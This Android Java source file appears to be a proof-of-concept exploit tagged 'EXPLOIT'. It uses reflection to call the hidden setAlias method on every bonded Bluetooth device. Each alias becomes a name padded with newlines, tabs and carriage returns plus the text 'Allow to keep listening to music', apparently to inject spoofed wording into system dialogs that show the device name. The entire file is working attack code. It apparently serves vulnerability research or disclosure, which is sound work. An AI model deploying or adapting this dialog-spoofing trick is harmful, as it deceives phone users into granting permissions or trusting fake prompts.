package dev.virtualpatch.bluetoothalias;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import java.lang.reflect.Method;
import java.util.Set;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "EXPLOIT";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @RequiresApi(api = Build.VERSION_CODES.S)
    @Override
    protected void onStart() {
        super.onStart();
        BluetoothAdapter ba = BluetoothAdapter.getDefaultAdapter();
        int hasReadPermission = 1;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            hasReadPermission = checkSelfPermission(Manifest.permission.BLUETOOTH_CONNECT);
        }
        if (hasReadPermission != PackageManager.PERMISSION_GRANTED) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                requestPermissions(new String[]{Manifest.permission.BLUETOOTH_CONNECT}, 2);
            }
        }
        Set<BluetoothDevice> devices = ba.getBondedDevices();
        Log.wtf(TAG, "Found " + devices.size() + " devices");
        for (BluetoothDevice device : devices) {
            try {
                Method setAlias = device.getClass().getMethod("setAlias", String.class);
                setAlias.invoke(device, "MyBluetoothSpeaker\n\n\n\n\n\n\n\n\t\tAllow to keep listening to music\r\r");

                Method getAlias = device.getClass().getMethod("getAlias");
                String alias = (String) getAlias.invoke(device);
                Log.wtf(TAG, alias);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}